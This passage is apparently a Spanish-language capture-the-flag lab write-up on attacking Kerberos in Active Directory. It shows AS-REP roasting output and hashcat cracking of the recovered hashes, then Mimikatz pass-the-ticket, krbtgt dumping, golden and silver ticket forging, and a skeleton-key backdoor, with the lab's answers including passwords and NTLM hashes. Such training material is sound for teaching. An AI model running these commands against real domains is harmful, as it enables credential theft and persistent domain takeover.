+
+[*] Action: AS-REP roasting
+
+[*] Target Domain          : CONTROLLER.local
+
+[*] Searching path 'LDAP://CONTROLLER-1.CONTROLLER.local/DC=CONTROLLER,DC=local' for AS-REP roastable users
+
+[*] SamAccountName         : Admin2
+
+[*] DistinguishedName      : CN=Admin-2,CN=Users,DC=CONTROLLER,DC=local
+
+[*] Using domain controller: CONTROLLER-1.CONTROLLER.local (fe80::cd42:3672:bc8a:4a26%5)
+
+[*] Building AS-REQ (w/o preauth) for: 'CONTROLLER.local\Admin2'
+
+[+] AS-REQ w/o preauth successful!
+
+[*] AS-REP hash:
+
+      $krb5asrep$Admin2@CONTROLLER.local:3223CAA39500AA03B68A68FDACCB8146$946528B5AEA7
+
+      F6DBCDDBB915939A27BCE1C739E8F211770F0ED1CBC4CBA6FD4EEC71E64ED8F45BD1CD4A746395F3
+
+      AAFD2FADBEBF7D8B7249A629D76595553FFEC8E2DCFA5E33B162F6890818F00BFCA0BB526698D548
+
+      3746F177F242BBD5A738CC9F22E75D81DBF246AC5A35329F1C4695043E0FE61291FA3C93B9370ABE
+
+      AC239C8BAFF37463FAA407FBE242616F3F7F34F036E4F52C95F37D631D69A5EA0D0247E93F3C0766
+
+      1CF46A40CF6066D7ACB02AC5658F190CC33A806C3392ED36F6E672B690055C00589ACAAC46F6F10E
+
+      174B3EDE35E594A73C1D67EF88B26C755600DA01581EFFB7535357D9005D15543C19C41E0762
+
+[*] SamAccountName         : User3
+
+[*] DistinguishedName      : CN=User-3,CN=Users,DC=CONTROLLER,DC=local
+
+[*] Using domain controller: CONTROLLER-1.CONTROLLER.local (fe80::cd42:3672:bc8a:4a26%5)
+
+[*] Building AS-REQ (w/o preauth) for: 'CONTROLLER.local\User3'
+
+[+] AS-REQ w/o preauth successful!
+
+[*] AS-REP hash:
+
+      $krb5asrep$User3@CONTROLLER.local:320B87B629C23444FFFB978A875BB94B$D893BFC324AD3
+
+      69E80533B8B0184AA255DF59F29BFC623AE9FBE1E3CB74E90A808BA20309787C518AEDF804B867C9
+
+      56C29BD9F56966C74C9BBFB764F659E4FA4CC423F9D342C0FB594ABA38E842124AC1365572FC7A77
+
+      8BA201901BBCF95BC56DC0719B317C80F880DDBA5B1CA747891115C6611BE488CFE683E4B3E89072
+
+      1A003ADC31F463CF4BB7EF29B10FAEE9444579E636D1BECEAB4B9DD5614F5AF223C695E21988E8C0
+
+      28C2494B0C963B490F112C11204D4F2EB3DBA4D1ED602A737FF93659FB05543CD3D18F7F10122C3C
+
+      DCB86738FCB0F635DF59C970806A8A0C2D412B20F4D2AE0764A84C0BEB8A0BD8F6F06CF2ECD
+
+**************************************************
+
+Finalmente volvemos a crackear con hashcat el hash de kerberos. En este caso, antes de crackearlo, debemos introducir 23$ después del $krb5asrep$, de modo que la primera línea comience así: $krb5asrep$23$User…
+Posteriormente, ya podremos pasar el hashchat como hasta ahora, pero con el flag -m 18200 (equivale a Kerberos 5, etype 23, AS-REP):
+
+
+Para user3:
+hashcat -m 18200 -a 0 ./user3hash.txt /usr/share/wordlists/rockyou2.txt –force
+**Nos devuelve:**
+
+$krb5asrep$23$User3@CONTROLLER.local:320b87b629c23444fffb978a875bb94b$d893bfc324ad369e80533b8b0184aa255df59f29bfc623ae9fbe1e3cb74e90a808ba20309787c518aedf804b867c956c29bd9f56966c74c9bbfb764f659e4fa4cc423f9d342c0fb594aba38e842124ac1365572fc7a778ba201901bbcf95bc56dc0719b317c80f880ddba5b1ca747891115c6611be488cfe683e4b3e890721a003adc31f463cf4bb7ef29b10faee9444579e636d1beceab4b9dd5614f5af223c695e21988e8c028c2494b0c963b490f112c11204d4f2eb3dba4d1ed602a737ff93659fb05543cd3d18f7f10122c3cdcb86738fcb0f635df59c970806a8a0c2d412b20f4d2ae0764a84c0beb8a0bd8f6f06cf2ecd:**Password3**
+
+
+**Para admin2:**
+hashcat -m 18200 -a 0 ./admin2hash.txt /usr/share/wordlists/rockyou2.txt –force
+$krb5asrep$23$Admin2@CONTROLLER.local:3223caa39500aa03b68a68fdaccb8146$946528b5aea7f6dbcddbb915939a27bce1c739e8f211770f0ed1cbc4cba6fd4eec71e64ed8f45bd1cd4a746395f3aafd2fadbebf7d8b7249a629d76595553ffec8e2dcfa5e33b162f6890818f00bfca0bb526698d5483746f177f242bbd5a738cc9f22e75d81dbf246ac5a35329f1c4695043e0fe61291fa3c93b9370abeac239c8baff37463faa407fbe242616f3f7f34f036e4f52c95f37d631d69a5ea0d0247e93f3c07661cf46a40cf6066d7acb02ac5658f190cc33a806c3392ed36f6e672b690055c00589acaac46f6f10e174b3ede35e594a73c1d67ef88b26c755600da01581effb7535357d9005d15543c19c41e0762:**P@$$W0rd2**
+
+
+
+5.1. What hash type does AS-REP Roasting use?
+Kerberos 5, etype 23, AS-REP
+
+5.2. Which User is vulnerable to AS-REP Roasting?
+User3
+
+5.3. What is the User's Password?
+Password3
+
+5.4. Which Admin is vulnerable to AS-REP Roasting?
+Admin2
+
+5.5. What is the Admin's Password?
+P@$$W0rd2
+
+
+
+IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII
+IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII
+IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII
+
+
+
+6.Pass the ticket usando Mimikatz:
+**Pass the Ticket** consiste en hacer un **dump de TGT** (ticket granting ticket) **desde la memoria de LSASS** (Local Security Authority Subsistem Service).
+El servicio de LSASS, es un **proceso de memoria** que **almacena credenciales** en un servidor de directorio activo y puede almacenar vales de Kerberos junto con otros tipos de credenciales para **actuar como guardián** **y aceptar o rechazar las credenciales** proporcionadas.
+
+
+PREPARAR EL ENTRONO PARA USAR MIMIKATZ Y HACER EL DUMP DE TICKETS:
+
+Iniciaremos una terminal como administrador.
+
+1º Navegamos a /Downloads del usuario.
+
+2º Descargamos si no tenemos ahí mimikats, posteriormente lo ejecutaremos.
+mimikatz.exe
+
+3º Ejecutamos **sekurlsa::tickets /export** (nos exportará todos los .kirbi tickets hacia nuestro directorio actual). Además deberemos de usar el encoder de base64 de Rubeus.
+Podemos ver que el último, es bastante interesante y útil para la etapa posterior.
+
+4º Ejecutamos el siguiente comando para impersonar el ticket indicado:
+kerberos::ptt [0;44470]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi
+
+5º Comprobamos con klist que se ha realizado correctamente la impersonificación del ticket
+
+
+
+
+IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII
+IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII
+IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII
+
+
+
+7.Ataque a Golden/Silver ticket mediante Mimikatz:
+Dump de los hashes KRBTGT:
+
+1º Navegar de nuevo a la carpeta de Downloads y volver a ejecutar mimikatz.exe
+
+2º ejecutamos el siguiente comando para hacer el dump de lo necesario para el ticket que querramos. Para crear un Silver Ticket, basta con cambiar /name: para hacer un dump del hash o una cuenta de administrador de dominio o una cuenta de servicio, como en nuestro caso, SQLService:
+lsadump::lsa /inject /name:krbtgt
+
+
+
+CREACIÓN DEL GOLDER/SILVER TICKET:
+
+**Este comando creará un Golden ticket, para crear un silver, basta con poner un hash de servicio NTLM en donde krbtgt, el sid de la cuenta de servicio y cambiar el id a 1103** 
+Kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:500
+
+Eso nos dará como resultado un archivo ticket.kirbi
+
+
+Ejecutando **misc::cmd** abrirá una cmd con derechos elevados gracias al ticket
+
+
+
+
+7.1.What is the SQLService NTLM Hash?**
+cd40c9ed96265531b21fc5b1dafcfb0a
+
+7.2. What is the Administrator NTLM Hash?
+2777b7fec870e04dda00cd7260f7bee6
+
+
+
+IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII
+IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII
+IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII
+
+
+
+8. Backdoor a Kerberos usando** **Mimikatz:
+
+Una puerta trasera de Kerberos es mucho más sutil porque actúa de manera similar a un rootkit al implantarse en la memoria del bosque de dominio, lo que le permite acceder a cualquiera de las máquinas con una contraseña maestra. 
+La clave maestra funciona abusando de las marcas de tiempo encriptadas AS-REQ como dije anteriormente, la marca de tiempo está encriptada con el hash NT de los usuarios. Luego, el controlador de dominio intenta descifrar esta marca de tiempo con el hash de NT del usuario, una vez que se implanta una clave maestra, el controlador de dominio intenta descifrar la marca de tiempo utilizando tanto el hash de NT del usuario como el hash de NT de la clave maestra que le permite acceder al bosque del dominio.
+
+1º Abrimos Mimikatz.exe
+
+2º Instalamos llame maestra mediante el siguiente comando:
+misc::skeleton
+La credencial por defecto es:  mimikatz
+Para acceder posteriormente al bosque:
+
+**Ejemplo:**
+
+net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz
+
+**La clave de esqueleto no persistirá por sí misma porque se ejecuta en la memoria, se puede programar o persistir usando otras herramientas y técnicas.**
